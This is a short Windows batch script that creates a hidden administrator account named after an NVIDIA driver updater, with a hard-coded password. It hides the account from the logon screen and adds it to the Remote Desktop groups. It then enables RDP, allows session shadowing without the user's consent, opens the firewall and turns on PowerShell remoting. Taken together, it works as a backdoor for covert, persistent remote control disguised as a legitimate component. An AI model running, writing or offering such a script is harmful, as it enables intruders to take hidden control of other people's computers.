@echo off
chcp 866
rem Add new user NVidiaDriverUpdater
net user NVidiaDriverUpdater SomePass1234 /add
rem Edit user's group, add admin & rdp access
net localgroup "Администраторы" NVidiaDriverUpdater /add
net localgroup "Administrator" NVidiaDriverUpdater /add
net localgroup "Пользователи" NVidiaDriverUpdater /delete
net localgroup "Users" NVidiaDriverUpdater /add
net localgroup "Пользователи удаленного рабочего стола" NVidiaDriverUpdater /add
net localgroup "Remote Desktop Users" NVidiaDriverUpdater /add
rem Hide user NVidiaDriverUpdater from logon screen
reg ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v "NVidiaDriverUpdater" /t REG_DWORD /d 0 /f
rem Allow shadow connections
reg ADD "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
rem Allow control without user's permission
reg ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v Shadow /t REG_DWORD /d 2 /f
rem Aplly Group Policies
gpupdate /force
rem Configure firewall
netsh firewall set service type = remoteadmin mode = enable
rem Set startup type of Remote Desktop Service to automatic
sc config termservice start=auto
rem start rdp service
sc start termservice
rem Change profile of all network adapters to private
powershell -Command "Get-NetAdapter | Set-NetConnectionProfile -NetworkCategory Private"
rem Enable the psremoting module
powershell -Command "Enable-PSRemoting"
